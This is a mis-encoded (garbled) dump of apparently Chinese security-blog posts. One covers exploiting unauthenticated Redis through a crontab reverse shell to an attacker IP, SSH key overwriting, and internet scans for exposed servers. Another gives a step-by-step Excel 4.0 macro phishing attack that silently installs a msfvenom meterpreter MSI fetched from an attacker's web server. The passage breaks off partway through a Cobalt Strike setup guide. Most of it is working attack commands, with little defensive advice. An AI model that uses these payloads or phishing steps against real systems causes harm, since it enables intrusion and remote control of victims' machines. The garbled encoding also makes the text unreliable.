ç›´æ¥å¾€å½“å‰ç”¨æˆ·çš„crontabé‡Œå†™å…¥åå¼¹shellï¼Œæ¢è¡Œæ˜¯å¿…ä¸å¯å°‘çš„ã€‚æ¯åˆ†é’Ÿå°è¯•è¿æ¥OK192.168.1.117:6379&gt; config set dbfilename rootOK192.168.1.117:6379&gt; save(error) ERR192.168.1.117:6379&gt; save(error) ERR192.168.1.117:6379&gt; get haha&quot;\\n\\n\\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.1.105/9999 0&gt;&amp;1\\n\\n\\n&quot; 192.168.1.117:6379&gt; saveOK192.168.1.117:6379&gt; ä¹‹æ‰€ä»¥ä¼šä¿å­˜é”™è¯¯æ˜¯å› ä¸ºå½“å‰ç”¨æˆ·å¯¹è¯¥æ–‡ä»¶å¤¹æ²¡æœ‰å†™æƒé™ï¼Œä¸ºäº†å®éªŒæ•ˆæœä¿®æ”¹å†æ¬¡ä¿å­˜å³å¯ è¿™é‡Œä¹Ÿå¼•èµ·åæ€ï¼Œå®æˆ˜ä¸­ç¢°åˆ°è¿™æ ·çš„é—®é¢˜è¯¥æ€ä¹ˆåŠï¼Ÿ æ£€éªŒæ— é”™è¯¯ cronè®¡åˆ’ä»»åŠ¡æœåŠ¡ä¹Ÿå·²ç»å¼€å¯ systemctl status cron ä½†æ­¤æ—¶ncå´è¿Ÿè¿Ÿæœªæ”¶åˆ°åå¼¹shell æ³¨æ„ï¼šæœ‰äº›ç³»ç»Ÿå¯¹ crontab çš„æ–‡ä»¶å†…å®¹çš„æ ¡éªŒæ¯”è¾ƒä¸¥æ ¼å¯èƒ½ä¼šå¯¼è‡´æ— æ³•æ‰§è¡Œå®šæ—¶ä»»åŠ¡ã€‚ æŒ‰ç…§ä¸€ä¸ªå‰è¾ˆçš„è¯´æ³•å°±æ˜¯Ubuntuçš„è®¡åˆ’ä»»åŠ¡ï¼Œå‰é¢æœ‰ä¹±ç å®ƒå°†æ— æ³•æ‰§è¡Œã€‚è€Œå¦‚æœæ¢æˆCentOså°±å¯ä»¥ï¼Œå› ä¸ºCentOså¯ä»¥è·³è¿‡ä¹±ç ï¼Œæ‰§è¡Œæ­£ç¡®çš„èƒ½æ‰§è¡Œçš„è®¡åˆ’ä»»åŠ¡ä»£ç ã€‚è¿™é‡Œå› ä¸ºæˆ‘æœªéƒ¨ç½²CentOsè™šæ‹Ÿæœºï¼Œå°±å½“ä½œæˆ‘åå¼¹æˆåŠŸäº†ï¼Œåç»­æœ‰æœºä¼šå†è¡¥ä¸ŠCentOs ä¸€ä¸ªå¸ˆå‚…æ€»ç»“çš„ä¸€äº›å®šæ—¶è®¡åˆ’ç›®å½• /var/spool/cron/ç”¨æˆ·å/var/spool/cron/crontabs/ç”¨æˆ·å/etc/crontab/etc/cron.d/xxx â€‹ çœ‹äº†ä¸Šé¢æ‰çŸ¥é“ï¼ŒåŸæ¥å½“åˆè®¾ç½®æ•°æ®åº“åå­—ä¸ºrootæ˜¯å¯¹rootç”¨æˆ·ï¼Œè€Œè¿™é‡Œæˆ‘çš„ç”¨æˆ·åæ˜¯xddï¼Œå› æ­¤é‡æ–°è®¾ç½®ä¸€ä¸‹ ncä¾ç„¶æ²¡æœ‰æ”¶åˆ°shellï¼Œå—¯ï¼è¿™æ ·å®éªŒæ‰æœ‰è¯´æœåŠ›ï¼Œçš„ç¡®æ˜¯Ubuntuçš„é—®é¢˜ ï¼ˆ3ï¼‰å¼€å‘ä¸å¸¸ç”¨è®¡åˆ’ä»»åŠ¡æ ¹æ®ä¸€ä¸ªå¸ˆå‚…çš„è¯´æ³•ï¼Œå¦‚æœå°è¯•ä»¥ä¸Šé¢è¿™ç§æ–¹æ³•å†™bashåå¼¹ï¼Œä¼šå¯¼è‡´è¦†ç›–åŸæ¥æœ‰çš„crontabè®¡åˆ’ä»»åŠ¡ï¼Œå› æ­¤æå…¶ä¸æ¨èç›´æ¥å†™åˆ°/var/spool/cronï¼Œä¸€æ—¦è¿ç»´åœ¨crontabä¸­é…ç½®äº†ä¸€äº›è„šæœ¬å¯åŠ¨ï¼Œç›²ç›®çš„è¦†ç›–ï¼Œä¼šå¯¹ä¸šåŠ¡äº§ç”Ÿæå¤§çš„ç ´å æ­£ç¡®çš„åšæ³•æ˜¯ï¼šé€‰æ‹©ä¸€ä¸ªå¼€å‘ä¸å¸¸ç”¨çš„è®¡åˆ’ä»»åŠ¡ ä»¥centos7ä¸ºä¾‹å­ å¯¹åº”çš„å«ä¹‰å¦‚ä¸‹ï¼šæ¯å¤©/æ¯æ—¥/æ¯å°æ—¶/æ¯æœˆ/æ¯å‘¨ å¯ä»¥å†™æ–‡ä»¶åˆ°/etc/cron.hourly/ å¯ä»¥è¦†ç›–0anacronæ–‡ä»¶ or åˆ›å»ºä¸€ä¸ªå¯æ‰§è¡Œçš„shæ–‡ä»¶ è¦†ç›–0anacronï¼Œæ­£å¸¸æƒ…å†µä¸‹ï¼Œæ²¡äººä¼šåœ¨è¿™é‡Œå†™è®¡åˆ’ä»»åŠ¡ï¼Œå¯ä»¥è¦†ç›–å®ƒï¼š åˆ›å»ºå¯æ‰§è¡Œshæ–‡ä»¶ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š è¿™æ ·å°±ä¸ä¼šè¦†ç›–æ–‡ä»¶ï¼Œæ¯”è¾ƒä¿é™© 3ã€å†™SSH keyåˆ©ç”¨å‰æ Redis æœåŠ¡å™¨è¿è¡Œåœ¨ root ç”¨æˆ·ä¸‹ï¼ˆå¦åˆ™è¿˜è¦çŒœæµ‹ç”¨æˆ·ï¼‰ æ­¤æœåŠ¡å™¨å¯¹å¤–å¼€å¯äº† ssh æœåŠ¡ Redis æœªæˆæƒè®¿é—®æ¼æ´ Linux ç³»ç»Ÿä½¿ç”¨ ssh çš„ç”¨æˆ·ç›®å½•ä¸‹éƒ½ä¼šæœ‰ä¸€ä¸ªéšè—æ–‡ä»¶å¤¹/.ssh/ã€‚æ¯”å¦‚æˆ‘è¿™é‡Œç”¨æˆ·æ˜¯ åªè¦æŠŠæˆ‘ä»¬çš„å…¬é’¥å†™åœ¨å¯¹æ–¹çš„ .ssh/authorized_keys æ–‡ä»¶é‡Œå†å»ç”¨ ssh è¿æ¥å°±ä¸éœ€æœåŠ¡å™¨çš„è´¦å·å¯†ç äº† å¼€å§‹å®éªŒï¼ ç”±äºæˆ‘Ubuntuçš„xddç”¨æˆ·ç›®å½•ä¸‹æ²¡æœ‰.sshæ–‡ä»¶ï¼Œé‚£å°±è‡ªå·±åˆ›å»ºä¸€ä¸‹ ssh-keygen -t rsa Kaliçš„id_rsa.pubï¼Œè¿™æ˜¯Kaliçš„å…¬é’¥ å°†å…¬é’¥ä¿¡æ¯å†™å…¥åˆ°key.txtä¸­ (echo -e &quot;\\n\\n&quot;;cat id_rsa.pub;echo -e &quot;\\n\\n&quot;) &gt; key.txt å°†xxxé”®çš„å€¼è®¾ç½®ä¸ºkey.txtçš„å†…å®¹ cat key.txt | redis-cli -h 192.168.1.117 -a haha123 -x set xxx å°†æ”»å‡»è€…çš„å…¬é’¥æ–‡ä»¶è¦†ç›–å†™å…¥åˆ°ç”¨æˆ·çš„authorized_keysä¸­ config set dir /home/xdd/.sshconfig set dbfilename authorized_keyssave å¦‚æœæœ¬æ¥å°±æœ‰authorized_keysæ–‡ä»¶ï¼Œé‚£ä¹ˆå°†ä¼šè¢«æ–°çš„è¦†ç›– â€‹ æ­¤æ—¶ç”¨æˆ·é‚£è¾¹æœ‰æˆ‘ä»¬æ”»å‡»è€…çš„å…¬é’¥æ–‡ä»¶ï¼Œæ”»å‡»è€…å°±å¯ä»¥ä½¿ç”¨ç§é’¥å…å¯†sshç™»å½•åˆ°ç”¨æˆ·çš„ä¸»æœºä¸Š ssh -i /home/kali/.ssh/id_rsa xdd@192.168.1.117 å…«ã€Redisæ”»å‡»æ€è·¯ï¼ˆ1ï¼‰å†…ç½‘ç«¯å£æ‰«æ nmap -v -n -Pn -p 6379 -sV --scriptredis-info 192.168.56.1/24 ï¼ˆ2ï¼‰é€šè¿‡æ–‡ä»¶åŒ…å«è¯»å–é…ç½®æ–‡ä»¶ ï¼ˆ3ï¼‰Redisé…ç½®æ–‡ä»¶ä¸­ä¸€èˆ¬ä¼šè®¾ç½®æ˜æ–‡å¯†ç ï¼Œåœ¨è¿›è¡Œæ¸—é€å“¦æ—¶å¯ä»¥é€šè¿‡webshellæŸ¥çœ‹å…¶é…ç½®æ–‡ä»¶ï¼ŒRediså¾€å¾€ä¸æ­¢ä¸€å°è®¡ç®—æœºï¼Œå¯ä»¥åˆ©ç”¨å…¶æ¥è¿›è¡Œå†…ç½‘æ¸—é€ï¼Œæˆ–è€…æ‰©å±•æƒé™æ¸—é€ ï¼ˆ4ï¼‰ä½¿ç”¨Redisæš´åŠ›ç ´è§£å·¥å…· https://github.com/evilpacket/redis-sha-crackï¼Œå…¶å‘½ä»¤ä¸ºï¼š node ./redis-sha-crack.js -w wordlist.txt -s shalist.txt 127.0.0.1 host2.example.com:5555 éœ€è¦å®‰è£…nodeï¼š git clone https://github.com/nodejs/node.git chmod -R 755 nodecd node./configuremake ï¼ˆ5ï¼‰msfä¸‹åˆ©ç”¨æ¨¡å— auxiliary/scanner/redis/file_upload normal Redis File Uploadauxiliary/scanner/redis/redis_login normal Redis Login Utilityauxiliary/scanner/redis/redis_server normal Redis Command Execute Scanner ä¹ã€Redisæ¼æ´æŒ–æ˜ å¯¹â€œport: 6379â€è¿›è¡Œæœç´¢ï¼šhttps://www.zoomeye.org/searchResult?q=port:6379 é™¤å»æ˜¾ç¤ºâ€œ-NOAUTH Authentication required.â€çš„ç»“æœï¼Œæ˜¾ç¤ºè¿™ä¸ªä¿¡æ¯è¡¨ç¤ºéœ€è¦è¿›è¡Œè®¤è¯ï¼Œä¹Ÿå³éœ€è¦å¯†ç æ‰èƒ½è®¿é—®ã€‚ https://fofa.so/ å…³é”®å­—æ£€ç´¢ï¼šport=&quot;6379&quot; &amp;&amp; protocol==redis &amp;&amp; country=CN åã€RedisåŸºæœ¬å®‰å…¨ç­–ç•¥ ç«¯å£ä¿®æ”¹ä¸ºå…¶ä»–ç«¯å£ï¼ˆé»˜è®¤ä¸º6379ï¼‰ requirepassè®¾ç½®å¤æ‚çš„å¯†ç  æœ€å¥½ä¸è¦ç”¨Rootç”¨æˆ·å»å¯åŠ¨Redisï¼Œè€Œæ˜¯å•ç‹¬ä¸ºRedisè®¾ç½®ä¸€ä¸ªè´¦å· è®¾ç½®æœ¬åœ°localhostä¸å…è®¸å¤–éƒ¨è®¿é—®ï¼Œè¿™æ ·å°±ä¸èƒ½è®©æ”»å‡»è€…å»çˆ†ç ´Redisçš„è¿æ¥å¯†ç  å¼€å¯ä¿æŠ¤æ¨¡å¼protected-modeï¼ˆé»˜è®¤å¼€å¯ï¼‰ æ£€æµ‹Keyï¼Œé€šè¿‡æœ¬åœ°ç™»å½•ï¼Œé€šè¿‡â€œkeys *â€å‘½ä»¤æŸ¥çœ‹ï¼Œå¦‚æœæœ‰å…¥ä¾µåˆ™å…¶ä¸­ä¼šæœ‰å¾ˆå¤šçš„å€¼ linuxä¸‹éœ€è¦æ£€æŸ¥authorized_keysï¼šRediså†…å»ºäº†åä¸ºcrackitçš„keyï¼Œä¹Ÿå¯ä»¥æ˜¯å…¶å®ƒå€¼ï¼ŒåŒæ—¶Redisçš„confæ–‡ä»¶ä¸­dirå‚æ•°æŒ‡å‘äº†/root/.sshï¼Œ/root/.ssh/authorized_keys è¢«è¦†ç›–æˆ–è€…åŒ…å«Redisç›¸å…³çš„å†…å®¹ï¼ŒæŸ¥çœ‹å…¶å€¼å°±å¯ä»¥ç›´åˆ°æ˜¯å¦è¢«å…¥ä¾µè¿‡ æ£€æŸ¥authorized_keysæ˜¯å¦éæ³•ï¼Œå¦‚æœå·²ç»è¢«ä¿®æ”¹ï¼Œåˆ™å¯ä»¥é‡æ–°ç”Ÿæˆå¹¶æ¢å¤ï¼Œä¸èƒ½ä½¿ç”¨ä¿®æ”¹è¿‡çš„æ–‡ä»¶ã€‚å¹¶é‡å¯sshæœåŠ¡ï¼ˆservice ssh restartï¼‰ å¯¹ç½‘ç«™è¿›è¡Œwebshellæ‰«æå’Œåˆ†æï¼šå‘ç°åˆ©ç”¨Redisè´¦å·æ¼æ´çš„ï¼Œåˆ™åœ¨shellä¸­ä¼šå­˜åœ¨Rediså­—æ ·ã€‚ ä¿®æ”¹confæ–‡ä»¶ç¦æ­¢å…¨ç½‘è®¿é—®ï¼Œæ‰“å¼€6379.confæ–‡ä»¶ï¼Œæ‰¾åˆ°bind0.0.0.0å‰é¢åŠ ä¸Š# ï¼ˆç¦æ­¢å…¨ç½‘è®¿é—®ï¼‰ ã€å¯å‚è€ƒåŠ å›ºä¿®æ”¹å‘½ä»¤ã€‘ å‘½ä»¤ æè¿° port ä¿®æ”¹redisä½¿ç”¨çš„é»˜è®¤ç«¯å£ bind è®¾å®šredisç›‘å¬çš„ä¸“ç”¨IP requirepass è®¾å®šredisè¿æ¥çš„å¯†ç  rename-command CONFIG â€œâ€ ç¦ç”¨CONFIGå‘½ä»¤ rename-command info info2 é‡å‘½åinfoä¸ºinfo2 åä¸€ã€å‚è€ƒé“¾æ¥ https://paper.seebug.org/1169/ https://www.cnblogs.com/piaomiaohongchen/p/15892170.html https://www.freebuf.com/column/170710.html","categories":[{"name":"Webå®‰å…¨","slug":"Webå®‰å…¨","permalink":"https://wolke.cn/categories/Web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"Webå®‰å…¨","slug":"Webå®‰å…¨","permalink":"https://wolke.cn/tags/Web%E5%AE%89%E5%85%A8/"},{"name":"Redis","slug":"Redis","permalink":"https://wolke.cn/tags/Redis/"}],"author":"w01ke"},{"title":"Excelå®é’“é±¼","slug":"Excelå®é’“é±¼","date":"2022-02-21T15:34:35.000Z","updated":"2022-02-28T11:29:42.952Z","comments":true,"path":"post/5cb87fce.html","link":"","permalink":"https://wolke.cn/post/5cb87fce.html","excerpt":"","text":"ä¸€ã€å‰è¨€Excelä¸€èˆ¬æŒ‡Microsoft Office Excelã€‚è¿™é‡Œå°±ä¸ç”¨å¤šè¯´äº†ï¼Œå®ƒè·Ÿofficeä¸€æ ·éƒ½æ˜¯æ”¯æŒå®çš„ï¼Œæ‰€ä»¥ä¸€æ ·å­˜åœ¨å®ç—…æ¯’ã€‚å½“æˆ‘ä»¬æŠŠæ¶æ„çš„å®ä»£ç åµŒå…¥Excelä¸­ï¼Œç”¨æˆ·æ‰“å¼€Excelæ–‡ä»¶é‡Œçš„å®å°±ä¼šè¢«è§¦å‘ï¼Œç„¶åæ‹¿åˆ°å¯¹æ–¹ç”µè„‘æƒé™ï¼Œå¹¶è¿›è¡Œæ§åˆ¶ã€‚ äºŒã€ç¯å¢ƒä»‹ç» ä¸‰ã€Excelå®èº²é¿æ€è½¯æ£€æµ‹1ã€åˆ¶ä½œmsiæ¶æ„æ–‡ä»¶åˆ©ç”¨msfvenomç”Ÿæˆmsiæ¶æ„åé—¨æ–‡ä»¶ï¼Œè¿™é‡Œè¿˜æœ‰å¾ˆå¤šæ–¹æ³•å¯ä»¥ç”Ÿæˆmsiï¼Œå…æ€ä¹Ÿå¯ä»¥åœ¨è¿™é‡Œå¼€å§‹è¿›è¡Œï¼ msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.43.167 lport=4444 -f msi -o w01ke.msi 2ã€å»ºç«‹ç›‘å¬msf6 &gt; use exploit/multi/handler[*] Using configured payload generic/shell_reverse_tcpmsf6 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcppayload =&gt; windows/meterpreter/reverse_tcpmsf6 exploit(multi/handler) &gt; set lhost 192.168.43.167lhost =&gt; 192.168.43.167msf6 exploit(multi/handler) &gt; set lport 4444lport =&gt; 4444msf6 exploit(multi/handler) &gt; exploit -j # æŒç»­ç›‘å¬ 3ã€å¼€å¯WebæœåŠ¡python -m SimpleHTTPServer 8081 4ã€åˆ¶ä½œexcelå®é¦–å…ˆåœ¨windwosç¯å¢ƒåˆ©ç”¨excelåˆ›å»ºä¸€ä¸ª.xlsxçš„æ–‡ä»¶ï¼ åˆ›å»ºå¥½ååŒå‡»æ‰“å¼€ï¼Œå¹¶åœ¨å·¦ä¸‹è§’å³é”®ç‚¹å‡»sheetï¼Œç„¶åç‚¹å‡»æ’å…¥ï¼ é€‰æ‹©MS Excel 4.0å®è¡¨â€¦. ç„¶ååœ¨å·¦ä¸Šè§’ç¬¬ä¸€ä¸ªæ ¼å­è¾“å…¥ï¼š =EXEC(&quot;msiexec /q /i http://192.168.43.167:8081/w01ke.msi&quot;) # è°ƒç”¨æ‰§è¡ŒæœåŠ¡å™¨ä¸Šçš„w01ke.msiæ–‡ä»¶[+] /i æŒ‡å®šæ­£å¸¸å®‰è£…ã€‚[+] /q é™é»˜å®‰è£… â€‹ ç¬¬äºŒä¸ªæ ¼å­è¾“å…¥ =HALT() # è¡¨ç¤ºExcel 4.0å®ç»“æŸï¼Œç±»ä¼¼Cè¯­è¨€returnæŒ‡ä»¤ ç‚¹å‡»ä¸€ä¸‹Aï¼ˆä»£è¡¨é€‰ä¸­ç¬¬ä¸€åˆ—ï¼‰ï¼Œç„¶åå°†å·¦ä¸Šè§’çš„A1æ¨¡å¼æ‰‹åŠ¨è¾“å…¥ï¼šAuto_Openï¼ŒEnterå›è½¦å³å¯ï¼ ä¸ºäº†é¿å…å¯¹æ–¹æ‰“å¼€èƒ½çœ‹åˆ°å®æ–‡ä»¶ï¼Œä»¥åŠå¢å¼ºéšè”½æ€§ï¼Œå°†å®è¿›è¡Œéšè—ï¼ ä¿å­˜ä¸ºxlsmæ–‡ä»¶æ ¼å¼ 5ã€å¼•è¯±ç”¨æˆ·ä¸‹è½½å’Œå¯ç”¨æ¶æ„å®æ–‡ä»¶é€šè¿‡ç¤¾å·¥ç­‰æ‰‹æ®µï¼Œå¼•è¯±ç”¨æˆ·ä¸‹è½½eval.xlsmæ–‡ä»¶ï¼Œæ‰“å¼€æ–‡ä»¶å¹¶ä¸”å¯ç”¨å® 6ã€åå¼¹shell å››ã€å‚è€ƒé“¾æ¥ https://www.freebuf.com/articles/web/258797.html","categories":[{"name":"ç¤¾å·¥","slug":"ç¤¾å·¥","permalink":"https://wolke.cn/categories/%E7%A4%BE%E5%B7%A5/"}],"tags":[{"name":"é’“é±¼","slug":"é’“é±¼","permalink":"https://wolke.cn/tags/%E9%92%93%E9%B1%BC/"},{"name":"ç¤¾å·¥","slug":"ç¤¾å·¥","permalink":"https://wolke.cn/tags/%E7%A4%BE%E5%B7%A5/"},{"name":"APT","slug":"APT","permalink":"https://wolke.cn/tags/APT/"}],"author":"w01ke"},{"title":"CobaltStrikeå®‰è£…åŠåŸºæœ¬ä½¿ç”¨ä¸å†…ç½‘æ¸—é€","slug":"CobaltStrikeå®‰è£…åŠè¯¦ç»†ä½¿ç”¨","date":"2022-02-16T17:26:19.000Z","updated":"2022-03-09T04:48:47.906Z","comments":true,"path":"post/57d03e3e.html","link":"","permalink":"https://wolke.cn/post/57d03e3e.html","excerpt":"","text":"ä¸€ã€CobaltStrikeç®€ä»‹CobaltStrikeæ˜¯ä¸€æ¬¾æ¸—é€æµ‹è¯•ç¥å™¨ï¼Œè¢«ä¸šç•Œäººç§°ä¸ºCSç¥å™¨ã€‚CobaltStrikeåˆ†ä¸ºå®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯ï¼ŒæœåŠ¡ç«¯æ˜¯ä¸€ä¸ªï¼Œå®¢æˆ·ç«¯å¯ä»¥æœ‰å¤šä¸ªï¼Œå¯è¢«å›¢é˜Ÿè¿›è¡Œåˆ†å¸ƒå¼åå›¢æ“ä½œã€‚ CobaltStrikeé›†æˆäº†ç«¯å£è½¬å‘ã€æœåŠ¡æ‰«æï¼Œè‡ªåŠ¨åŒ–æº¢å‡ºï¼Œå¤šæ¨¡å¼ç«¯å£ç›‘å¬ï¼Œwindows exe æœ¨é©¬ç”Ÿæˆï¼Œwindows dll æœ¨é©¬ç”Ÿæˆï¼Œjava æœ¨é©¬ç”Ÿæˆï¼Œoffice å®ç—…æ¯’ç”Ÿæˆï¼Œæœ¨é©¬æ†ç»‘ã€‚é’“é±¼æ”»å‡»åŒ…æ‹¬ï¼šç«™ç‚¹å…‹éš†ï¼Œç›®æ ‡ä¿¡æ¯è·å–ï¼Œjava æ‰§è¡Œï¼Œæµè§ˆå™¨è‡ªåŠ¨æ”»å‡»ç­‰ç­‰å¼ºå¤§çš„åŠŸèƒ½ï¼ Cobalt Strike ä¸»è¦ç”¨äºå›¢é˜Ÿä½œæˆ˜ï¼Œå¯è°“æ˜¯å›¢é˜Ÿæ¸—é€ç¥å™¨ï¼Œèƒ½è®©å¤šä¸ªæ”»å‡»è€…åŒæ—¶è¿æ¥åˆ°å›¢ä½“æœåŠ¡å™¨ä¸Šï¼Œå…±äº«æ”»å‡»èµ„æºä¸ç›®æ ‡ä¿¡æ¯å’Œsessionsã€‚ Cobalt Strike ä½œä¸ºä¸€æ¬¾ååŒAPTå·¥å…·ï¼Œé’ˆå¯¹å†…ç½‘çš„æ¸—é€æµ‹è¯•å’Œä½œä¸ºaptçš„æ§åˆ¶ç»ˆç«¯åŠŸèƒ½ï¼Œä½¿å…¶å˜æˆä¼—å¤šAPTç»„ç»‡çš„é¦–é€‰ã€‚ äºŒã€CobaltStrikeçš„å®‰è£…å’Œå¯åŠ¨æˆ‘è¿™é‡Œä»¥Kaliä¸ºä¾‹ 1ã€å®‰è£…javaç¯å¢ƒè¿™é‡Œæˆ‘ç”¨çš„æ˜¯jdk-8u191-linux-x64.tar.gzï¼Œä¸‹è½½é“¾æ¥å‚ç…§ï¼šhttps://blog.csdn.net/DeweyLau/article/details/109636906 æ³¨æ„ï¼šjavaå¹¶ä¸æ˜¯å¿…é¡»è¦å®‰è£…åˆ°optç›®å½•ä¸‹ï¼Œè¯»è€…å¯ä»¥è‡ªè¡Œé€‰æ‹© ä¸Šä¼ åˆ°Kaliä¸­ï¼Œè§£å‹ï¼štar -xzvf jdk-8u191-linux-x64.tar.gzç§»åŠ¨åˆ°optç›®å½•ä¸‹ï¼š mv jdk1.8.0_191/ /opt/è¿›å…¥jdkç›®å½•ï¼šcd /opt/jdk1.8.0_191æ‰§è¡Œ vim ~/.bashrc å¹¶æ·»åŠ ä¸‹åˆ—å†…å®¹# install JAVA JDKexport JAVA_HOME=/opt/jdk1.8.0_191export CLASSPATH=.:$&#123;JAVA_HOME&#125;/libexport PATH=$&#123;JAVA_HOME&#125;/bin:$PATHä¿å­˜é€€å‡ºæ‰§è¡Œ: source ~/.bashrcæ‰§è¡Œï¼šupdate-alternatives --install /usr/bin/java java /opt/jdk1.8.0_191/bin/java 1update-alternatives --install /usr/bin/javac javac /opt/jdk1.8.0_191/bin/javac 1update-alternatives --set java /opt/jdk1.8.0_191/bin/javaupdate-alternatives --set javac /opt/jdk1.8.0_191/bin/javacæŸ¥çœ‹ç»“æœï¼šupdate-alternatives --config javaupdate-alternatives --config javac å‡ºç°ä¸Šå›¾æƒ…å†µè¯´æ˜å®‰è£…æˆåŠŸ 2ã€å®‰è£…CobalStrikeä¸Šä¼ åˆ°Kaliä¸­ï¼Œè§£å‹ï¼šunzip cobaltstrike-linux.zipè¿›å…¥cobalstrikeä¸­ï¼šcd cobaltstrike-linux/ ä¸€èˆ¬Cobalt Strikeç›®å½•ç»“æ„å¦‚ä¸‹ï¼š [+] agscript æ‹“å±•åº”ç”¨çš„è„šæœ¬[+] c2lint ç”¨äºæ£€æŸ¥profileçš„é”™è¯¯å¼‚å¸¸[+] teamserver æœåŠ¡ç«¯ç¨‹åº[+] cobaltstrikeï¼Œcobaltstrike.jar å®¢æˆ·ç«¯ç¨‹åº(javaè·¨å¹³å°)[+] license.pdf è®¸å¯è¯æ–‡ä»¶[+] logs ç›®å½•è®°å½•ä¸ç›®æ ‡ä¸»æœºçš„ç›¸å…³ä¿¡æ¯ [+] updateï¼Œupdate.jar ç”¨äºæ›´æ–°CS [+] third-party ç¬¬ä¸‰æ–¹å·¥å…· å°†å®‰è£…ç›®å½•è§£å‹è¿›å…¥ç›®å½•åï¼Œå¯ä»¥ç»™æ‰€æœ‰æ–‡ä»¶èµ‹äºˆ777æƒé™ chmod 777 ./* 3ã€å¯åŠ¨æœåŠ¡ç«¯å›¢é˜ŸæœåŠ¡å™¨æœ€å¥½è¿è¡Œåœ¨Linuxå¹³å°ä¸Šï¼ŒæœåŠ¡ç«¯çš„å…³é”®æ–‡ä»¶æ˜¯teamserverå’Œcobaltstrike.jarï¼Œå°†è¿™ä¸¤ä¸ªæ–‡ä»¶æ”¾åœ¨åŒä¸€ç›®å½•ä¸‹è¿è¡Œï¼š ./teamserver &lt;host&gt; &lt;password&gt; [/path/to/c2.profile] [YYYY-MM-DD]&lt;host&gt; å¿…éœ€å‚æ•° å›¢é˜ŸæœåŠ¡å™¨IP&lt;password&gt; å¿…éœ€å‚æ•° è¿æ¥æœåŠ¡å™¨çš„å¯†ç [/path/to/c2.profile] å¯é€‰å‚æ•° æŒ‡å®šC2é€šä¿¡é…ç½®æ–‡ä»¶ï¼Œä½“ç°å…¶å¼ºå¤§çš„æ‰©å±•æ€§[YYYY-MM-DD] å¯é€‰å‚æ•° æ‰€æœ‰payloadçš„ç»ˆæ­¢æ—¶é—´# å¯åŠ¨Team Serversudo ./teamserver [å½“å‰å¼€å¯æœåŠ¡ç«¯è®¾å¤‡çš„IPåœ°å€] [å®¢æˆ·ç«¯ç™»å½•å¯†ç ] # è®¾ç½®å¼ºå¯†ç ï¼Œå¦åˆ™å®¹æ˜“è¢«çˆ†ç ´ï¼Œå‚è€ƒé™„å½• æ¯”å¦‚è¿™é‡Œæˆ‘çš„Kaliæ˜¯éƒ¨ç½²åœ¨å†…ç½‘çš„ï¼ŒIPåœ°å€æ˜¯192.168.1.104ï¼Œè®¾ç½®å®¢æˆ·ç«¯çš„ç™»å½•å¯†ç ä¸º123456 sudo ./teamserver 192.168.1.104 123456 PSï¼šå›¢é˜ŸæœåŠ¡å™¨é»˜è®¤è¿æ¥ç«¯å£ä¸º50050ï¼Œå¦‚æœä½ æƒ³ä¿®æ”¹ç«¯å£åªéœ€ä¿®æ”¹teamserveræ–‡ä»¶ å¦‚æœè¿è¡Œä¸Šè¿°å‘½ä»¤å‡ºç°ä»¥ä¸‹æŠ¥é”™ä¿¡æ¯ [-] keytool is not in $PATH install the Java Developer Kit æ˜æ˜javaå·²ç»å®‰è£…å¥½äº†ï¼Œä½†æ˜¯ä¸€ç›´æŠ¥é”™ï¼Œäºæ˜¯é©¬ä¸Šæ£€æŸ¥ keytool è·¯å¾„ï¼Œçªç„¶å‘ç° keytool æŒ‡å‘çš„è·¯å¾„æ˜¯é”™è¯¯çš„ï¼Œäºæ˜¯é‡æ–°é…ç½®äº†ä¸€æ³¢è·¯å¾„ï¼ŒæˆåŠŸè§£å†³ sudo ln -s /opt/jdk1.8.0_191/bin/keytool /usr/bin/ ç¡®å®š java è·¯å¾„ï¼Œæˆ‘çš„æ˜¯ /opt/jdk1.8.0_191/bin/keytool äºæ˜¯ç”¨ä¸Šé¢çš„å‘½ä»¤åˆ›å»ºä¸€æ¡è½¯é“¾æ¥ã€‚ æ³¨æ„ï¼šå¦‚æœå®‰è£…javaæ—¶è·Ÿæˆ‘å®‰è£…çš„ä¸åŒï¼Œä¸Šé¢çš„è·¯å¾„æ”¹æˆä½ ä»¬å½“æ—¶å®‰è£…çš„è·¯å¾„å³å¯ å¦‚æœæç¤ºå·²å­˜åœ¨ï¼Œå¯ä»¥ç”¨ rm -rf ./keytool å‘½ä»¤åˆ é™¤é‡å»º 4ã€å®¢æˆ·ç«¯è¿æ¥Linuxï¼š**./cobaltstrike**æˆ–**java -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar** Windowsï¼šåŒå‡»**cobaltstrike.exe** è¾“å…¥æœåŠ¡ç«¯IPï¼Œç«¯å£é»˜è®¤50050ï¼Œç”¨æˆ·åä»»æ„ï¼Œå¯†ç ä¸ºä¹‹å‰è®¾ç½®çš„å¯†ç ï¼Œç‚¹å‡»connectã€‚ç¬¬ä¸€æ¬¡è¿æ¥ä¼šå‡ºç°hashæ ¡éªŒï¼Œè¿™é‡Œçš„hashç­‰äºå‰é¢çš„å¯åŠ¨teamserveræ—¶çš„hashï¼Œç›´æ¥ç‚¹å‡»â€œæ˜¯â€å³å¯è¿æ¥åˆ°å›¢é˜ŸæœåŠ¡å™¨ä¸Šã€‚ ä¸‰ã€å‚æ•°è¯¦è§£1ã€Cobalt Strike[+] New Connection # æ–°å»ºè¿æ¥ï¼Œæ”¯æŒè¿æ¥å¤šä¸ªæœåŠ¡å™¨ç«¯[+] Preferences # è®¾ç½®Cobal Strikeç•Œé¢ã€æ§åˆ¶å°ã€ä»¥åŠè¾“å‡ºæŠ¥å‘Šæ ·å¼ã€TeamServerè¿æ¥è®°å½•[+] Visualization # ä¸»è¦å±•ç¤ºè¾“å‡ºç»“æœçš„è§†å›¾[+] VPN Interfaces # è®¾ç½®VPNæ¥å£[+] Listenrs # åˆ›å»ºç›‘å¬å™¨[+] Script Manager # è„šæœ¬ç®¡ç†ï¼Œå¯ä»¥é€šè¿‡AggressorScriptsè„šæœ¬æ¥åŠ å¼ºè‡ªèº«ï¼Œèƒ½å¤Ÿæ‰©å±•èœå•æ ï¼ŒBeaconå‘½ä»¤è¡Œï¼Œææƒè„šæœ¬ç­‰[+] Close # é€€å‡ºè¿æ¥ 2ã€View[+] Applications # æ˜¾ç¤ºå—å®³ä¸»æœºçš„åº”ç”¨ä¿¡æ¯[+] Credentials # 